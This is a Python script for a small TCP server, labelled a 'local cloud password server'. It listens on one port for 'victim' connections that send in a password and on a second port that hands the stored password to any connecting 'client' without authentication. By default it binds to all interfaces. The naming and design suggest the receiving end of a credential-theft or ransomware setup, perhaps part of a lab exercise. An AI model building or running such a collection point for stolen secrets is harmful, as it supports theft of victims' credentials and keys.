#!/usr/bin/env python3

from __future__ import annotations

import argparse
import signal
import socket
import threading
from contextlib import suppress

DEFAULT_VICTIM_HOST = "0.0.0.0"
DEFAULT_VICTIM_PORT = 5555
DEFAULT_CLIENT_HOST = "0.0.0.0"
DEFAULT_CLIENT_PORT = 5556
BUFFER_SIZE = 4096

stop_event = threading.Event()
victim_ready = threading.Event()
victim_lock = threading.Lock()
stored_password = b""


def parse_args() -> argparse.Namespace:
	parser = argparse.ArgumentParser(
		description="Local cloud password server",
	)
	parser.add_argument("--victim-host", default=DEFAULT_VICTIM_HOST)
	parser.add_argument("--victim-port", type=int, default=DEFAULT_VICTIM_PORT)
	parser.add_argument("--client-host", default=DEFAULT_CLIENT_HOST)
	parser.add_argument("--client-port", type=int, default=DEFAULT_CLIENT_PORT)
	return parser.parse_args()


def handle_victim_connection(conn: socket.socket, addr: tuple[str, int]) -> None:
	global stored_password
	try:
		conn.send(b"k")
		chunks: list[bytes] = []
		while not stop_event.is_set():
			chunk = conn.recv(BUFFER_SIZE)
			if not chunk:
				break
			chunks.append(chunk)

		password = b"".join(chunks)
		if not password:
			print(f"Ignored empty password from {addr[0]}:{addr[1]}", flush=True)
			return

		with victim_lock:
			stored_password = password
		victim_ready.set()
		print(
			f"Stored password from {addr[0]}:{addr[1]} ({len(stored_password)} bytes)",
			flush=True,
		)
	except OSError as exc:
		print(f"Password ingest error from {addr[0]}:{addr[1]}: {exc}", flush=True)
	finally:
		with suppress(OSError):
			conn.shutdown(socket.SHUT_RDWR)
		with suppress(OSError):
			conn.close()


def handle_client_connection(conn: socket.socket, addr: tuple[str, int]) -> None:
	try:
		while not stop_event.is_set() and not victim_ready.is_set():
			victim_ready.wait(timeout=1.0)

		with victim_lock:
			password = stored_password

		if not password:
			print(f"No password available for {addr[0]}:{addr[1]}", flush=True)
			return

		conn.sendall(password)
		print(f"Sent password to {addr[0]}:{addr[1]}", flush=True)
	except OSError as exc:
		print(f"Client serve error to {addr[0]}:{addr[1]}: {exc}", flush=True)
	finally:
		with suppress(OSError):
			conn.shutdown(socket.SHUT_RDWR)
		with suppress(OSError):
			conn.close()


def accept_loop(host: str, port: int, handler: callable, label: str) -> None:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server.bind((host, port))
		server.listen()
		server.settimeout(1.0)
		print(f"Listening for {label} on {host}:{port}", flush=True)

		while not stop_event.is_set():
			try:
				conn, addr = server.accept()
			except TimeoutError:
				continue
			except OSError:
				if stop_event.is_set():
					break
				raise

			thread = threading.Thread(target=handler, args=(conn, addr), daemon=True)
			thread.start()


def serve(victim_host: str, victim_port: int, client_host: str, client_port: int) -> None:
	signal.signal(signal.SIGINT, lambda *_: stop_event.set())
	signal.signal(signal.SIGTERM, lambda *_: stop_event.set())

	victim_thread = threading.Thread(
		target=accept_loop,
		args=(victim_host, victim_port, handle_victim_connection, "passwords"),
		daemon=True,
	)
	client_thread = threading.Thread(
		target=accept_loop,
		args=(client_host, client_port, handle_client_connection, "clients"),
		daemon=True,
	)

	victim_thread.start()
	client_thread.start()

	print("Local cloud server", flush=True)
	while not stop_event.is_set():
		stop_event.wait(1.0)


def main() -> None:
	args = parse_args()
	serve(args.victim_host, args.victim_port, args.client_host, args.client_port)


if __name__ == "__main__":
	main()
